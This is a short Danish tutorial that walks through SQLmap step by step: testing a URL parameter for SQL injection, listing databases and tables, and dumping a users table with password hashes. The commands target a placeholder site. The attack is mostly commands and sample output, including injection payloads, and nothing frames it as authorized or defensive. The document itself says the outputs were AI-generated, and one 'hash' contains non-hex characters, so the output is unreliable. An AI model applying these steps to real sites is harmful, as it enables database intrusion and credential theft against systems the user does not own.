# SQLmap
## 1: Scan target-url som har en eller flere parametre
-u er et af de mest fundamentale options til SQLmap, som først og fremmest er shorthand for --url 
og som basically betyder at det url der bliver givet er target. --batch siger "Y, Yes" og "Continue" til alle prompts under scanningen.
```bash
sqlmap -u "http://www.target.com/page.php?id=58" --batch
```
Herefter vil du ofte blive mødt med noget som dette
```console
[10:36:01] [INFO] testing connection to the target URL
[10:36:01] [WARNING] the web server responded with an HTTP error code (403) which could interfere with the results of the tests
you have not declared cookie(s), while server wants to set its own ('__cf_bm=hirEvEYfJ9u...NTHQX6z9c4'). Do you want to use those [Y/n] Y
[10:36:01] [INFO] checking if the target is protected by some kind of WAF/IPS
[10:36:02] [WARNING] reflective value(s) found and filtering out
[10:36:02] [INFO] testing if the target URL content is stable
[10:36:02] [WARNING] target URL content is not stable (i.e. content differs).
```
Hvis der bliver fundet en sårbarhed i dit target URL vil det ligne noget alá det her.
```console
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=58 AND 2667=2667

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=58 AND (SELECT 6286 FROM(SELECT COUNT(*),CONCAT(0x71766a6a71,(SELECT (CASE WHEN (6286=6286) THEN 1 ELSE 0 END)),0x71706a7671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=58 UNION ALL SELECT NULL,NULL,CONCAT(0x71766a6a71,0x536c4b69754f6c4c5145,0x71706a7671)-- -

[12:14:05] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.7, PHP 5.5.9
back-end DBMS: MySQL >= 5.0
```


## 2: Efter initial scan, så find detaljerede informationer på target databaser
Her er kommandoen "-dbs" vigtig, da det er den der finder alle de tilængelige
databaser med deres navne.
```bash
sqlmap -u "http://www.target.com/page.php?id=58" --dbs --batch
```
Hvis scanningen lykkes, vil du måske få noget som dette.
```console
[13:37:00] [INFO] fetching database names
available databases [2]:
[*] information_schema
[*] acme_shop_db
```

## 3: Udvælg en database og find tabeller
Det er nu tid til at vælge en af de databaser som er fundet i step 2. I dette eksempel "acme_shop_db" og se hvilke tabeller den indeholder.
Her bruger man -D til at navngive/vælge den ønskede Database og --tables option, til at finde de tabeller til databasen.
```bash
sqlmap -u "http://www.target.com/page.php?id=58" -D acme_shop_db --tables --batch
```
Hvor du så vil blive mødt med noget som dette.
```console
Database: acme_shop_db
[4 tables]
+-----------+
| users     |
| products  |
| orders    |
| config    |
+-----------+
```

## 4: Hent data fra tabellen (dump)
Den fjerde og sidste del ville så være at hente den data du har fundet frem til igennem SQLmap som gøres således.
```bash
sqlmap -u "http://www.target.com/page.php?id=58" -D acme_shop_db -T users --dump --batch
```

Som måske ville kunne se sådan ud (afhængig af hvordan databasen er blevet designet)
```console
Database: acme_shop_db
Table: users
[2 entries]
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
| 1  | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 |
| 2  | support  | 9a8b7c6d5e4f3g2h1i0j1k2l3m4n5o6p |
+----+----------+----------------------------------+
```
















NOTE: Outputs der er brugt som eksempler på hvordan et reelt output kunne se ud er generet med AI og ikke med ægte Hosts.
